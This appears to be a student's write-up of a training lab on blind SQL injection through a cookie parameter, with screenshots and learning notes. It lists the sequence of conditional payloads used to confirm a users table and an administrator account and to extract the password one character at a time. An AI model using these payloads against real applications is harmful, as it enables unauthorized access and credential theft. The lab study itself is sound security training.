# Lab Name
Blind SQL injection with conditional responses.

## Vulnerability
Blind SQL Injection 

## Objective
Exploit Blind SQL Injection with conditional responses.

## Entry Point
Cookie parameter

## Payload Used
' AND 1=1--

<img width="1497" height="767" alt="2" src="https://github.com/user-attachments/assets/3234626e-0182-47d9-a2a8-2e495b5f7a33" />

' AND (SELECT 'a' FROM users LIMIT 1)= 'a'--

<img width="1487" height="777" alt="2 1" src="https://github.com/user-attachments/assets/9ff2ab63-540a-4d8d-8080-00657925ab1f" />

' AND (SELECT 'a' FROM users WHERE username= 'administrator')= 'a'--

<img width="1491" height="786" alt="2 2" src="https://github.com/user-attachments/assets/fae9da89-5777-4e58-9e90-08fe5216bda9" />

' AND (SELECT 'a' FROM users WHERE username= 'administrator'AND LENGTH (password)>1 )= 'a'--

<img width="1515" height="777" alt="2 3" src="https://github.com/user-attachments/assets/00c81fac-2d22-489b-b8e1-663be14a3a1e" />

' AND (SELECT SUBSTRING (password,1,1)>'0' FROM users where username='administrator')

<img width="1500" height="812" alt="2 4" src="https://github.com/user-attachments/assets/b4180847-920d-45e7-bf08-8c22891374c1" />

## Result
Successfully extracted the administrator password using conditional blind SQL injection.

<img width="1847" height="912" alt="image" src="https://github.com/user-attachments/assets/f358c845-0064-45e3-af22-9d2d81714def" />

## Learning
- Blind SQL injection occurs when the application does not show SQL errors or query output directly.
- Attackers rely on TRUE/FALSE conditions and observe changes in application responses.
- Conditional queries can be used to test guesses about database data.
- Functions like LENGTH() and SUBSTRING() help extract data one character at a time.
- Authentication or session logic can be manipulated through cookie parameters.
- Blind SQL attacks are slower but still allow full data extraction.
- Lack of input validation and parameterized queries makes applications vulnerable.
